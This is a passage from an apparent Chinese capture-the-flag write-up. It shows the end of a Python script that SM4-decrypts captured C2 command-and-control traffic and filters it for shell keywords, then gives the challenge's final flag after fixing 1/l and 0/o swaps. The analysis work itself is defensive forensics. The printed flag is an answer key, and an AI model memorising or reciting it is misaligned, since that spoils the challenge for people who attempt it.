    for h in hex_blocks:

        ct = bytes.fromhex(h)

        for i in range(0, len(ct), 16):

            out += sm4_decrypt_block(ct[i:i+16], rk)

    return out

  

if __name__ == "__main__":

    C2_HEX_BLOCKS = [这里就是C2通信里面的数据，太大了，关键词进行筛选

    ]

  
 print("===== CLEAN C2 OUTPUT =====")
    for line in extract_ascii(raw):
        if any(k in line for k in ["pwd","id","ls","cat","flag{"]):
            print(line)
```


然后解密结果为

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228193539328.png)


可以发现这里的1和l,0和o替换了

我们改一下即可就得到最终的flag

flag{6894c9ec-719b-4605-82bf-4fe1de27738f}

















































